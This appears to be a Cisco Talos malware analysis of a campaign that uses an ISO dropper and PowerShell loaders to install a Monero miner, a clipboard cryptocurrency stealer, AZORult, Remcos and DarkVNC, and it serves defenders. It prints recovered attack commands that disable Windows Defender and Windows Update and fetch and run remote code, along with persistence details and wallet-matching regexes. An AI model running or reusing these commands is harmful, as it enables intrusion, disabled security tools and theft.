Cisco Talos recently discovered a complex campaign with several\ndifferent executable payloads, all focused on providing financial benefits for the attacker in a slightly different way. The first payload is a\nMonero cryptocurrency miner based on XMRigCC, and the second is a trojan that monitors the clipboard and replaces its content. There's\n\n\n-----\n\n[also a variant of the infamous AZORult information stealing malware, a variant of Remcos remote access tool and, finally, the](https://attack.mitre.org/software/S0344/) [DarkVNC](https://reaqta.com/2017/11/short-journey-darkvnc/)\nbackdoor trojan.\n\n**What's new?**\n\nEmbedding an executable downloader in an ISO image file is a relatively new method of delivery for AZORult. It's also unusual to see\nattackers using multiple methods to make money.\n\n**How did it work?**\n\nThe infection chain starts with a ZIP file, which contains an ISO disk image file. When the user opens the ISO file, a disk image containing an\nexecutable loader is mounted. When the loader is launched, it deobfuscates malicious code which downloads the first obfuscated PowerShell\nloader stage that kickstarts the overall infection, disables security tools and Windows update service and downloads and launches the\npayloads.\n\n**So what?**\n\nDefenders need to be constantly vigilant and monitor the behavior of systems within their network. Attackers are like water — they will\nattempt to find the smallest crack to achieve their goals. While organizations need to be focused on protecting their most valuable assets,\nthey should not ignore threats that are not particularly targeted toward their infrastructure.\n\n## Technical case overview\n\n**Introduction**\n\nThe initial trigger for this investigation was a telemetry entry that showed a PowerShell process launching a download and executing a\nPowerShell loader.\n\nAfter the drill-down, the telemetry shows that the PowerShell downloading code was launched by an executable dropper included in an ISO\nimage that's mounted within the operating system by the user. The ISO image seems to have been downloaded compressed with ZIP,\npossibly encrypted with a password, which indicates it's primarily spread via email.\n\n**Executable dropper with anti-sandboxing**\n\nThe dropper's functionality is rather simple, but the code contains some interesting features. All malicious API calls are resolved dynamically\nbut locating the PEB and traversing one of the lists of loaded modules in memory to find the module address. From there, the downloader\ngoes through the export table in order to find and return the address of the required functions which is then indirectly called using one of the\n'call reg' instructions.\n\nAll strings, including the entire command line for the downloader PowerShell code are encrypted with a static byte key, different for each\nstring, which also gets decrypted during the execution.\n\n_Command-line for the PowerShell downloader is deobfuscated using a byte XOR key._\n\nThe most interesting feature is the function that randomly calls APIs from the lists twice. First, two randomly generated numbers from 0 to 9\nare generated by a pseudo-random number generator and those numbers — m and n are used as parameters for the function.\n\n\n-----\n\n-----\n\n_Random API calls function_\n\nThe function first randomly chooses and calls m and then n APIs from the list:\n\nGetCommandLineA\nGetTickCount\nGetLastError\nGetSystemDefaultLangID\nGetCurrentProcess\nGetProcessHeap\nGetEnvironmentStrings\n\nThis is likely done to confuse behavioral detectors, emulators and sandboxes which may base their detections on sequences of executed API\ncalls.\n\nThe downloader eventually calls the MessageBox API to display a fake error message.\n\n_Executable downloader fake error message._\n\n**First stage PowerShell loader**\n\nThe first stage of the PowerShell loader is a simple command line:\n\nWhen the base64 command-line option is decoded, we reach the actual downloading code which uses githubusercontent.com to first disable\nWindows Defender, stop Windows update, download and execute the next malware stage using the Invoke-Expression cmdlet.\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\ncmd /c reg add 'HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f\ncmd /c sc stop wuauserv\\r\\ncmd /c sc config wuauserv start= disabled\niex ((New-Object \nSystem.Net.WebClient).DownloadString('hxxps://gist[.]githubusercontent[.]com/mysslacc/a5b184d9d002bf04007c4bbd2a53eeea/raw/c6f8b4c3\n\n```\n[The downloaded PowerShell script is first base64-decoded and decrypted using the cmdlet ConvertTo-SecureString. The result is an](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view%3Dpowershell-7)\nobfuscated PowerShell script with several layers of obfuscation, a result of applying the Invoke-Obfuscation method to the initial code. Once\ndeobfuscated, we can see the functionality of the PowerShell loader.\n\n**PowerShell loader**\n\nThe PowerShell script downloaded and executed by the executable downloader is responsible for the installation of payloads and ensuring\nthat they stay persistent after user logs out. All the payloads are downloaded from external sites.\n\nThe loader first sets the PowerShell preferences so that the warning and error messages are not displayed and so that the script continues\nexecuting if an error is encountered.\n```\n$WarningPreference = \"SilentlyContinue\"\n$erroractionpreference = \"SilentlyContinue\"\n\n```\n\n-----\n\nThe execution continues with checking the current privileges. The loader behaves differently if the user has administrative privileges.\n\nIf the user does not have administrative privileges, the loader creates the registry value HKCU\\Software\\Kumi and stores a base64 encoded\n[string that contains code to download and execute a variant of XMRigCC cryptocurrency miner. It then creates a scheduled task with the](https://github.com/Bendr0id/xmrigCC)\nname OneDrive SyncTask to execute hourly and launch the miner which is read from the previously created registry entry.\n\nIf the user belongs to the administrators' group, the loader will first create exclusion folders for the Windows Defender so that certain folders\nare not scanned and then attempt to disable various Defender's user notifications so that the user is not notified if any of the components in\nthe attack are detected. Malwarebytes anti-malware service will also be stopped and deleted if it exists on the computer.\n\nFinally, if the loader has administrative privileges it will attempt to create three services WinDefends, thundersec and WindowsNetworkSVC,\nand create three scheduled tasks to launch those services on an hourly basis. The task names are \\Microsoft\\Windows\\Shell\\updshell,\n\\Microsoft\\Windows\\Autochk\\SystemProxy and \\Microsoft\\Windows\\MobilePC\\DetectPC.\n\nAt the time of writing, the first URL contained a loader for either a variant of Remcos remote access tool or a variant of DarkVNC remote\naccess trojan. If the user has administrative privileges, the loader launches Remcos. Otherwise, it launches DarkVNC.\n\nThe loader then downloads and launches a clipboard modification trojan from githubusercontent.com with the filename clp.exe in the user's\ntemporary folder. This cryptocurrency stealer is described later.\n\nRegardless of the permissions, the loader will create a registry value HKCU\\Software\\cr\\d and store the code to download and launch one of\nthe above backdoor trojans and creates a scheduled task \"Update Shell\" to run every five hours. The task retrieves the value stored as a\nbase64 encoded string in the registry and downloads code from the URL hxxps://raw[.]githubusercontent[.]com/mysslacc/thd/master/base.\n\nFinally, the loader uses a process injector RunPE to inject a variant of the Azorult information-stealing trojan into the notepad.exe process.\n\n_Process tree of the PowerShell loader as seen in Cisco Threat Grid_\n\n**Payloads**\n\n**XMRigCC cryptominer**\n\nPerhaps the least interesting payload installed by the loader, XMRigCC is a variant of an open-source miner that can be controlled through a\ncommand and control (C2) console. XMRigCC has its own loader, which is called by decoding and executing the content of the variable\n$kumi of the main loader.\n\nThe particular payload is not configured to connect to a command and control server but chooses its pool host from a list of the following\nURLs. All connections are conducted over port 443, possibly to avoid easy detections when other ports are used.\n\nThe list of hosts from the configuration is:\n\neu[.]minerpool[.]pw\n185[.]10[.]68[.]220\nrig[.]zxcvb[.]pw\nrig[.]myrms[.]pw\nback123[.]brasilia[.]me\nrs[.]fym5gserobhh[.]pw\n\n\n-----\n\n_Cisco Umbrella showing a spike of DNS requests for eu[.]minerpool[.]pw._\n\nThe cryptominer installs itself depending on the loader's process privileges. If the PowerShell loader has administrative privileges, it will\nattempt to disable Windows Defender, Malwarebytes, Sophos and HitMan Pro if they are installed. The loader then downloads the payload\nfrom the IP address 195.123.234.33, and copies it into C:\\ProgramData\\Oracle\\Java\\java.exe.\n\nOne of the interesting features is the download of a third-party driver, WinSys0 from the OpenLibSys utility, which allows the client application\nto read and write physical memory. However, it seems that the driver is not used and there is no evidence of the driver being loaded into\nmemory.\n\nThe loader creates the following scheduled tasks:\n\n\\Microsoft\\Windows\\Bluetooth\\UpdateDeviceTask\n\\Microsoft\\Windows\\Shell\\WindowsShellUpdate\n\\Microsoft\\Windows\\Shell\\WinShell\n\\Microsoft\\Windows\\UPnP\\UPnPHost\n\\Microsoft\\Windows\\UPnP\\UPnPClient Task\n\\Microsoft\\Windows\\SMB\\SMB Task\n\\Microsoft\\Windows\\EDP\\EDP App Lock Task\n\\Microsoft\\Windows\\EDP\\EDP App Update Cache\n\\Microsoft\\Windows\\MobilePC\\DetectPC\n\\Microsoft\\Windows\\.NET Framework\\.NET Framework Cache Optimization\n\\Microsoft\\Windows\\.NET Framework\\.NET Framework Cache Optimization Files-S-3-5-21-2236678155-433529325-2142214968-1138\n\nand creates one of the two services, depending on the bitness of the operating system:\n\ncli_optimization_v2.0.55727_64\ncli_optimization_v2.0.55727_32\n\nThe services simply call mshta.exe to download an HTML application that downloads and runs the same cryptominer loader.\n\nThe loader downloads and runs a PowerShell script del.ps1 that disables Windows event logging and attempts to terminate system utilities\nsuch as Process Explorer, Task Manager, Process Monitor and Daphne Task Manager.\n\nThe non-administrative branch of the cryptominer loader is quite similar and takes into account that changes are made to objects that can be\nmodified by the current user.\n\nHere is the list of new scheduled task names created by the lower-privilege branch of the loader:\n\nOneDrive Sync\nOneDrive SyncTask\nOptimization .NET\nOptimize Start Menu Cache Files-S-3-5-21-2236678155-433519125-1142214968-1037\nOptimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1137\nOptimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1138\nOptimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1337\n\n\n-----\n\nOptimize Start Menu Cache Files S 3 5 21 2236678155 433529325 1142214968 1447\nOptimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142314968-1037\n\\Microsoft\\Windows\\Optimization\n\n**Clipboard cryptocurrency stealer**\n\nThe next payload is a cryptocurrency clipboard-stealing trojan. The main loader downloads it from\nhxxps://gist[.]githubusercontent[.]com/mysslacc/ee6d2b99f8e3a3475b7a36d9e96d1c18/raw/1a82b38931d8421406f53eb8fc4c771127b27ce4/clp,\nsaves it in the user's temporary folder as \"clp.exe,\" which is then launched.\n\nThe trojan copies itself into the file updip.exe in the user's ProgramData\\updip folder and creates a link file udpid.lnk in the user's Startup\nfolder so that the malware runs every time the user logs into the system. The link file is created by a PowerShell process that is called directly\nby the trojan with a long command line containing a base64-encoded script.\n\nThe persistence is also ensured by creating a new scheduled task — GoogleChromeUpdateTask — which runs the trojan every three hours.\n\nApart from the installation and persistence, the main functionality of the trojan is contained in a simple loop that monitors the clipboard content\nevery half a second. The trojan contains an obfuscated list of regular expressions used to match the clipboard content. The strings are stored\neither as a data buffer or as constants assigned to contiguous memory locations. Once a buffer is created, its contents are XORd with the\nbyte key 0x2e.\n\n_Deobfuscating a regex to match Bitcoin addresses._\n\nHere, we see that the trojan initialises a memory buffer with the value\n70751f1d73754f03454303546f03666403607e03741e031773551c18021d1d53, which after XOR, reveals a regular expression #^[13][a-kmzA-HJ-NP-Z0-9]{26,33}$, apparently used to match Bitcoin addresses. If a Bitcoin address is matched, the malware calls the routine to modify\nthe clipboard, presumably to redirect any transactions to the address owned by the attacker.\n\n\n-----\n\n_Decrypting attacker's Bitcoin wallet address to replace the clipboard data._\n\nBased on the arguments of the function, the trojan will choose one of the attacker-owned cryptocurrency addresses and modify the clipboard\nto contain the deobfuscated data. Once again, we see here that the buffer is filled with the value\n1d6d5d4a17745f1a5c1f184a787f5b7c6b5d1b1c571b4b646849776b5f7f446f561f, which becomes the address\n3Csd9Zq4r16dVQuREs52y5eJFgYEqQjAx1 after deobfuscation. We can easily see that this address earned just a bit under six Bitcoins over\ntime.\n\n_The number of transactions and the amount earned by the clipboard stealer in Bitcoins._\n\nThe trojan targets Bitcoin, Litecoin, Ethereum, Dash, Monero and Doge-Coin using the following regular expressions:\n```\n^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$ - Bitcoin\n^0x[a-fA-F0-9]{40}$\n^[LM][A-z][1-9A.z]{32}$\n^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$ Doge-Coin\n^DX[a-z][1-9A-z]{32}$ - Dash - incorrect regular expression\n^[0-9][0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}$ - Monero\n\n```\nThe next three payloads are all delivered using a PowerShell technique which downloads an obfuscated binary loader and a byte array in a\ntext format and transforms them into actual binaries. The download is executed by using reflection to load the VisualBasic assembly and then\ninteract with PowerShell using the VisualBasic interaction interface. The script first decompresses and loads a binary loader RunPE, which is\nthen used to load a byte array that contains the binary payload into the process space of a newly created process, explorer.exe, control.exe\nor notepad.exe for Remcos, DarkVNC and Azorult respectively. All of the payloads are common so we will only briefly describe them. A full\nanalysis is outside of the scope of this post.\n\n\n-----\n\n_Downloading and loading RunPE that loads a DarkVNC payload from a byte array_\n\n**AZORult**\n\n[AZORult is an information-stealing bot written in Delphi which connects to a command and control server for so-called \"work\", which comes in](https://attack.mitre.org/software/S0344/)\na format of a JSON configuration. The communication with the C2 server is conducted using HTTP with the payload encrypted with a default\nXOR key 0x0d, 0x0a, 0xc8.\n\nOnce installed, the bot contacts the server using a POST request. Depending on the version of the bot the server can send a JSON\nconfiguration or a set of DLLs to help with stealing information as well as a set of new strings that should be used when matching targeted\ncontent for exfiltration.\n\nAZORult may attempt to execute one or more of:\n\nSteal stored browser passwords\nSteal cryptocurrency wallets\nSteal browser history\nSteal website cookies\nSteal email credentials\nSteal Telegram credentials\nSteal Steam credentials\nSteal Skype credentials and message history\nTake victim machine screenshots\nExecute custom commands\n\n**Remcos**\n\n[Remcos is a RAT that is offered for sale by a company called Breaking Security. While the company says it will only sell the software for](https://blog.talosintelligence.com/2018/08/picking-apart-remcos.html)\nlegitimate uses as described in comments in response to the article here and will revoke the licenses for users not following their EULA, the\nsale of the RAT gives attackers everything they need to establish and run a potentially illegal botnet.\n\nRemcos has the functionalities that are typical of a RAT. It is capable of hiding in the system and using malware techniques that make it\ndifficult for the typical user to detect the existence of Remcos. It is written in C++ and is relatively small for the rich functionality it contains.\n\n[The Remcos payload included by the PowerShell loader is the latest version 2.5.0. Talos has created a decoder that allows simple extraction](https://github.com/Cisco-Talos/remcos-decoder/blob/master/remcos_decryptor.py)\nof Remcos configurations. Cisco Umbrella shows an increase in requests for the default C2 domain dfgdgertdvdf.xyz of the sample around\nthe time we found the initial PowerShell loader.\n\n\n-----\n\n_DNS activity for the default C2 domain of the Remcos payload._\n\n**DarkVNC**\n\nIf the user does not have administrative privileges the loader will attempt to load a variant of the DarkVNC trojan, which allows the attacker to\nremotely access the infected system using the VNC protocol. The C2 server IP address for this sample, 52.15.61.57, is shared with one of the\nC2 domains specified in the Remcos sample configuration — dfgdgertdvdf.online.\n\nThis IP address has been actively used in several campaigns from at least mid-December 2019.\n\nIndeed, we can see that the DNS activity for this domain corresponds with the activity for the default Remcos C2. DarkVNC attempts to\nconnect to the C2 server using the TCP port 8080, likely to be less suspicious as this is one of the default ports for connections to HTTP\nproxies.\n\n_DNS activity for the default C2 domain of the DarkVNC payload._\n\nDarkVNC launches a new svchost.exe process and depending on the bitness of the operating system injects a version of a 32- or 64-bit DLL\ninto the svchost.exe process space. The loaded library is extracted from the dropper and it contains remote access functionality.\n\n**Conclusion**\n\nIn this post, we covered an attack that comes from an actor with a low to medium level of technical ability but quite a clear idea on how to\nachieve their financial goals. For that they decided to employ a combination of several payloads, ranging from a cryptocurrency miner to wellknown information stealer AZORult, remote access tools Remcos and DarkVNC and a clipboard modification trojan.\n\n\n-----\n\n_Loaders and payloads used in the AZORult, Remcos et co attack._\n\nIt is worth remembering that even in special times for cyber criminals, it is just business as usual. Furthermore, as users are worried by the\nSARS-CoV-2 pandemic and are increasingly working from home the attackers will take advantage and continue to conduct their attacks with\na higher probability of remaining unnoticed.\n\n**Coverage**\n\nWays our customers can detect and block this threat are listed below.\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.
